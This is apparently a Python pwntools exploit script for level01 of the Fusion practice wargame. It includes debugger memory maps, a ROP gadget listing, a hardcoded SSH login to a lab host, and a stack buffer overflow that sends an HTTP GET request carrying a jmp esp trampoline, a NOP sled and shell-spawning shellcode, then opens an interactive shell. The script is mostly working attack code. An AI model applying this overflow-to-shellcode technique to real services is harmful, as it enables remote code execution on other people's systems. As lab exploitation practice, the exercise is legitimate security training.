#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')

'''
root@fusion:/opt/fusion/bin# ldd level01
    linux-gate.so.1 =>  (0xb7863000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb76db000)
    /lib/ld-linux.so.2 (0xb7864000)
root@fusion:/opt/fusion/bin# strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
1388da /bin/sh

(gdb) info proc mapping
process 3964
cmdline = '/opt/fusion/bin/level01'
cwd = '/opt/fusion/bin'
exe = '/opt/fusion/bin/level01'
Mapped address spaces:

Start Addr   End Addr       Size     Offset objfile
0x8048000  0x804b000     0x3000          0       /opt/fusion/bin/level01
0x804b000  0x804c000     0x1000     0x2000       /opt/fusion/bin/level01
0xb7e56000 0xb7e57000     0x1000          0        
0xb7e57000 0xb7fcd000   0x176000          0       /lib/i386-linux-gnu/libc-2.13.so
0xb7fcd000 0xb7fcf000     0x2000   0x176000       /lib/i386-linux-gnu/libc-2.13.so
0xb7fcf000 0xb7fd0000     0x1000   0x178000       /lib/i386-linux-gnu/libc-2.13.so
0xb7fd0000 0xb7fd3000     0x3000          0        
0xb7fdd000 0xb7fdf000     0x2000          0        
0xb7fdf000 0xb7fe0000     0x1000          0           [vdso]
0xb7fe0000 0xb7ffe000    0x1e000          0       /lib/i386-linux-gnu/ld-2.13.so
0xb7ffe000 0xb7fff000     0x1000    0x1d000       /lib/i386-linux-gnu/ld-2.13.so
0xb7fff000 0xb8000000     0x1000    0x1e000       /lib/i386-linux-gnu/ld-2.13.so
0xbffdf000 0xc0000000    0x21000          0           [stack]
'''



'''
siuser@ubuntu:~/ctf/fusion/level01$ msfelfscan -p level01
[level01]
0x08048bf2 pop ebx; pop ebp; ret
0x08049066 pop edi; pop ebp; ret
0x0804960a pop edi; pop ebp; ret
0x08049977 pop edi; pop ebp; ret
0x08049a2e pop edi; pop ebp; ret
0x08049a77 pop ebx; pop ebp; ret
'''
pop2 = 0x08048bf2



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def sendFile(payload):
    s = ssh(host='192.168.12.131', user='fusion', password='godmode')
    s.upload_data(payload, '/tmp/payload')

io = remote('192.168.12.131', 20001)
padding = cyclic_find(0x61616b62)

jmpEsp = 0x08049f4f
jmpEsi = b'\x90'*2 + asm('jmp esi')

payload =  b'GET ' 
payload += b'a'*padding 

payload += p32(jmpEsp)
payload += jmpEsi

payload += b' HTTP/1.1' # Necessary formatter 
payload += b'\x90'*100  # NOP sled
payload +=  asm(shellcraft.sh()) # Our shellcode
sendFile(payload)
io.sendline(payload)
io.interactive()

